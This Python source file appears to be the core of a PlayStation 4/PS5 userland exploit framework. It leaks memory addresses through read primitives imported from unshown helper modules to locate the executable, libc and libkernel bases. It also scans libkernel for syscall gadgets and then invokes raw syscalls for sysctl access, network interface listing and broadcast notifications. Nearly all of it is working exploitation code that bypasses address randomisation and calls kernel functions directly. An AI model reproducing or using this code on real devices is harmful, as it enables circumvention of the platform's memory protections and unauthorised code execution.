import struct
from types import FunctionType
from utils.unsafe import getmem, readuint, readbuf
from utils.etc import addrof, alloc
from utils.ref import refbytes
from utils.rp import log
from utils.conversion import get_cstring
from constants import (
    SELECTED_LIBC,
    SELECTED_EXEC,
    nogc,
)
from structure import Structure
from calls import Function, Syscall, FunctionContainer, SyscallContainer


O_WRONLY = 1


class SploitCore(object):
    def __init__(self):
        self.mem = getmem()

        log("[*] Obtained memory object")

        func_type_addr = addrof(FunctionType)
        log("[*] FunctionType address: 0x%x" % func_type_addr)
        func_repr_addr = readuint(func_type_addr + 11 * 8, 8)
        log("[*] FunctionType.tp_repr address: 0x%x" % func_repr_addr)

        self.exec_addr = func_repr_addr - SELECTED_EXEC["func_repr"]
        log("[*] Executable base address: 0x%x" % self.exec_addr)

        self.libc_addr = (
            readuint(self.exec_addr + SELECTED_EXEC["strcmp"], 8)
            - SELECTED_LIBC["strcmp"]
        )
        log("[*] libc base address: 0x%x" % self.libc_addr)

        self.functions = FunctionContainer(self)
        self.syscalls = SyscallContainer(self)

        self.platform = None
        self.version = None
        self._prepare_syscall()

    def _prepare_syscall(self):
        gettimeofday_in_libkernel = readuint(
            self.libc_addr + SELECTED_LIBC["gettimeofday"], 8
        )
        log("[*] gettimeofday address: 0x%x" % gettimeofday_in_libkernel)

        # eh why not
        self.make_function_if_needed("gettimeofday", gettimeofday_in_libkernel)

        mod_info = Structure(
            [
                ("unknown1", 0x128),
                ("init_proc_addr", 8),
                ("unknown2", 0x30),
                ("segments", 8),
                ("unknown3", 0x198),
            ],
        ).create()

        sceKernelGetModuleInfoFromAddr_addr = readuint(
            self.libc_addr + SELECTED_LIBC["sceKernelGetModuleInfoFromAddr"], 8
        )
        ret = self.make_function_if_needed(
            "sceKernelGetModuleInfoFromAddr", sceKernelGetModuleInfoFromAddr_addr
        )(
            gettimeofday_in_libkernel,
            1,
            mod_info,
        )

        if ret != 0:
            raise Exception("sceKernelGetModuleInfoFromAddr failed: 0x%x" % ret)

        self.libkernel_addr = mod_info.segments
        log("[*] libkernel base address: 0x%x" % self.libkernel_addr)
        init_proc_addr = mod_info.init_proc_addr
        delta = self.libkernel_addr - init_proc_addr

        if delta == 0:
            self.platform = "ps4"
            libkernel_buf = readbuf(self.libkernel_addr, 0x40000)
            pattern = (
                0x48,
                0xC7,
                0xC0,
                None,
                None,
                None,
                None,
                0x49,
                0x89,
                0xCA,
                0x0F,
                0x05,
            )
            self.syscall_table = {}
            limit = len(libkernel_buf) - len(pattern) + 1
            for idx in range(limit):
                for off, val in enumerate(pattern):
                    if val is not None and libkernel_buf[idx + off] != val:
                        break
                else:
                    syscall_number = struct.unpack(
                        "<I", libkernel_buf[idx + 3 : idx + 7]
                    )[0]
                    syscall_gadget_addr = self.libkernel_addr + idx
                    self.syscall_table[syscall_number] = syscall_gadget_addr
            if not self.syscall_table:
                raise Exception("syscall gadget pattern not found")
            log("[*] syscall gadget table built")
        elif delta == 0x10:
            self.platform = "ps5"
            self.syscall_addr = (
                gettimeofday_in_libkernel + 0x7
            )  # to skip `mov rax, <num>`
            log("[*] syscall gadget address: 0x%x" % self.syscall_addr)
        else:
            raise Exception("Unknown platform (delta: 0x%x)" % delta)

        buf = alloc(8)
        size = alloc(8)
        size[0:8] = struct.pack("<Q", 8)
        if self.sysctl("kern.sdk_version", buf, size):
            lower, upper = struct.unpack("<BB", buf[2:4])
            self.version = "%x.%02x" % (upper, lower)
            log("[*] Detected OS version: %s" % self.version)
        else:
            log("[*] Could not detect OS version")

    def make_function_if_needed(self, name, func_addr):
        if name not in self.functions.functions:
            self.functions.functions[name] = Function(self, func_addr)
        return self.functions.functions[name]

    def make_syscall_if_needed(self, name, syscall_number):
        if name not in self.syscalls.syscalls:
            self.syscalls.syscalls[name] = Syscall(self, syscall_number)
        return self.syscalls.syscalls[name]

    def send_notification(self, msg):
        icon_uri = b"cxml://psnotification/tex_icon_system"
        # notify_buf = bytearray(0xC30)
        notify_buf = Structure(
            [
                ("unknown1", 0x10),
                ("target_id", 4),
                ("unknown2", 0x18),
                ("use_icon_image_url", 1),
                ("message", 0x400),
                ("icon_uri", 0x400),
                ("padding", 0x403),
            ]
        ).create()

        notify_buf.target_id = 0xFFFFFFFF  # broadcast to all users
        notify_buf.use_icon_image_url = 0x10

        msg_bytes = msg.encode("utf-8")
        notify_buf.set_field_raw("message", msg_bytes)
        notify_buf.set_field_raw("icon_uri", icon_uri)

        dev_path = b"/dev/notification0\0"
        fd = self.syscalls.open(
            dev_path,
            O_WRONLY,
        )
        if fd < 0:
            log("[-] Failed to open notification device")
            return

        self.syscalls.write(
            fd,
            notify_buf,
            notify_buf.size,
        )
        self.syscalls.close(
            fd,
        )

    def get_all_network_interfaces(self):
        count = self.syscalls.netgetiflist(
            0,
            10,
        )
        if count == -1:
            raise Exception(
                "netgetiflist failed to get count, errno: %d\n%s"
                % (
                    self.syscalls.netgetiflist.errno,
                    self.syscalls.netgetiflist.get_error_string(),
                )
            )
        log("[*] Found %d network interfaces" % count)

        buf_size = count * 0x1E0
        ifbuf = b"\0" * buf_size
        nogc.append(ifbuf)

        if (
            self.syscalls.netgetiflist(
                refbytes(ifbuf),
                count,
            )
            == -1
        ):
            raise Exception(
                "netgetiflist failed to get interfaces, errno: %d\n%s"
                % (
                    self.syscalls.netgetiflist.errno,
                    self.syscalls.netgetiflist.get_error_string(),
                )
            )

        interfaces = {}
        for i in range(count):
            entry = ifbuf[i * 0x1E0 : (i + 1) * 0x1E0]
            name = get_cstring(entry, 0)
            ip = ".".join(
                [str(struct.unpack("<B", b)[0]) for b in entry[0x28 : 0x28 + 4]]
            )
            interfaces[name] = ip

        return interfaces

    def get_current_ip(self):
        interfaces = self.get_all_network_interfaces()
        for name, ip in interfaces.items():
            if name in ["eth0", "wlan0"] and ip not in ["0.0.0.0", "127.0.0.1"]:
                return ip

    def sysctl(self, name, oldp=0, oldlenp=0, newp=0, newlenp=0):
        name_bytes = name.encode("utf-8") + b"\0"
        nogc.append(name_bytes)
        translate_name_mib = alloc(8)
        buf_size = 0x70
        mib = alloc(buf_size)
        size = alloc(8)
        size[0:8] = struct.pack("<Q", buf_size)
        translate_name_mib[0:8] = struct.pack("<Q", 0x300000000)

        if (
            self.syscalls.sysctl(
                translate_name_mib,
                2,
                mib,
                size,
                name_bytes,
                len(name),
            )
            < 0
        ):
            raise Exception(
                "sysctl failed to translate name to mib, errno: %d\n%s"
                % (self.syscalls.sysctl.errno, self.syscalls.sysctl.get_error_string())
            )

        if (
            self.syscalls.sysctl(
                mib,
                2,
                oldp,
                oldlenp,
                newp,
                newlenp,
            )
            < 0
        ):
            return False

        return True

    def get_sysctl_int(self, name):
        buf = alloc(4)
        size_buf = alloc(8)
        size_buf[0:8] = struct.pack("<Q", 4)

        if not self.sysctl(name, buf, size_buf):
            raise Exception("sysctl %s failed" % name)

        return struct.unpack("<I", buf[0:4])[0]

    def set_sysctl_int(self, name, value):
        buf = alloc(4)
        size_buf = alloc(8)
        buf[0:4] = struct.pack("<I", value)
        size_buf[0:8] = struct.pack("<Q", 4)

        if not self.sysctl(name, 0, 0, buf, size_buf):
            raise Exception("sysctl %s failed" % name)

        return True


sc = SploitCore()
